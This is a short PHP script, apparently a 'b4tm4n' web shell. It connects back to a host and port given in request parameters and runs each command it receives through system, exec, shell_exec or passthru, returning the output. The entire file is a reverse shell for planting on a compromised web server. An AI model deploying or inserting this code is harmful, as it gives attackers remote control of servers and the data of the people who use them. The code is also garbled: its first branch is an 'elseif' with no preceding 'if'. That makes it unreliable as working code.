<?php
function Execute($x)
{
	$x=$x.' 2>&1';
	elseif(function_exists('system'))
	{
		ob_start();
		$system=system($x);
		$buff=ob_get_contents();
		ob_end_clean();
		return $buff;
	}
	elseif(function_exists('exec'))
	{
		$buff="";
		exec($x,$results);
		foreach($results as $result)
		{
			$buff.=$result;
		}
		return $buff;
	}
	elseif(function_exists('shell_exec'))
	{
		$buff=shell_exec($x);
		return $buff;
	}
	elseif(function_exists('passthru'))
	{
		ob_start();		
		$passthru=passthru($x);
		$buff=ob_get_contents();
		ob_end_clean();	
		return $buff;
	}
	
	return "R.I.P Command";
}

echo "start";
$host=$_REQUEST['reverse-ip'];
$port=$_REQUEST['reverse-port'];
$sock=@fsockopen($host,$port,$errno,$errstr);
				
while(!feof($sock)) 
{
	fwrite($sock,"[b4tm4n]:");
	$command=fgets($sock,1024);
	if(trim($command)=='quit'||trim($command)=='exit')
	{
		fclose($sock);
		printf($command);
		exit;
	}
	fwrite($sock,Execute($command));
}
fclose($sock);
?>